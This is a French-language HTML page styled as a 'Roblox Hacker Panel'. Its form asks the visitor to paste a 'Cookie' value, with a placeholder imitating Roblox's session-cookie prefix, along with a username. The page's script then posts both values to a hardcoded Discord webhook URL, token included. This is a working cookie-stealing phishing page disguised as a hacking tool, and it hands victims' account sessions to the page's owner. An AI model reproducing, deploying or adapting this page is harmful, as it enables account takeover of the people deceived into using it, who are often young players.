<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Roblox Hacker Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:"Consolas","Fira Code",monospace;}
body{
  height:100vh;overflow:hidden;background:#000;color:#c9ffe6;
  display:flex;align-items:center;justify-content:center;position:relative;
}
body::before{
  content:"";position:absolute;inset:0;
  background:linear-gradient(120deg,#00ff88 0%,#00331d 40%,#00ff88 80%);
  opacity:.12;animation:gradientMove 8s infinite linear;
}
@keyframes gradientMove{0%{transform:translateX(-20%);}100%{transform:translateX(20%);}}
.panel{
  position:absolute;width:420px;background:rgba(0,20,10,.85);
  border:1px solid #00ff8855;border-radius:16px;backdrop-filter:blur(18px);
  box-shadow:0 0 25px #00ff8844;padding:20px;
}
.field{margin-bottom:15px;}
.field label{font-size:.8rem;color:#8cffc7;}
.field input{
  width:100%;margin-top:4px;padding:10px;border-radius:10px;
  border:1px solid #00ff8855;background:#00170d;color:#c9ffe6;
}
.btn{
  width:100%;padding:10px;border-radius:999px;border:1px solid #00ff88;
  background:linear-gradient(120deg,#00331d,#00ff8844);color:#c9ffe6;
  text-transform:uppercase;letter-spacing:.14em;cursor:pointer;
}
.btn:hover{box-shadow:0 0 18px #00ff8866;transform:translateY(-1px);}
.toast{
  position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(120%);
  background:#002a18;border:1px solid #00ff8855;padding:10px 18px;border-radius:999px;
  color:#afffe0;font-size:.8rem;opacity:0;transition:.25s;
}
.toast.show{transform:translateX(-50%) translateY(0%);opacity:1;}
</style>
</head>
<body>

<div class="panel">
  <div class="field">
    <label>Cookie:</label>
    <input id="profileLink" placeholder="_|WARNING:....">
  </div>

  <div class="field">
    <label>Username :</label>
    <input id="username" placeholder="Your user">
  </div>

  <button class="btn" id="sendBtn">SEND</button>
</div>

<div class="toast" id="toast">Message envoyé !</div>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1504983773224374333/gkTO5rXkdZjvGAdAlCLs_OKi6NukdyQsmqq5sg19unEHwfigUGjiZNp-syyH8dd6Bxvq";

function toast(msg){
  const t=document.getElementById("toast");
  t.textContent=msg;t.classList.add("show");
  setTimeout(()=>t.classList.remove("show"),2500);
}

document.getElementById("sendBtn").addEventListener("click",async()=>{
  const link=document.getElementById("profileLink").value.trim();
  const user=document.getElementById("username").value.trim();

  if(!link || !user){
    toast("Remplis les deux champs.");
    return;
  }

  const payload={
    embeds:[{
      title:"📌 Nouveau profil envoyé",
      description:
        `**Profile Link :** ${link}\n`+
        `**Username :** ${user}`,
      color:0x00ff88,
      footer:{text:"Roblox Hacker Panel"},
      timestamp:new Date().toISOString()
    }]
  };

  try{
    await fetch(WEBHOOK_URL,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify(payload)
    });
    toast("Envoyé !");
  }catch{
    toast("Erreur webhook.");
  }
});
</script>

</body>
</html>
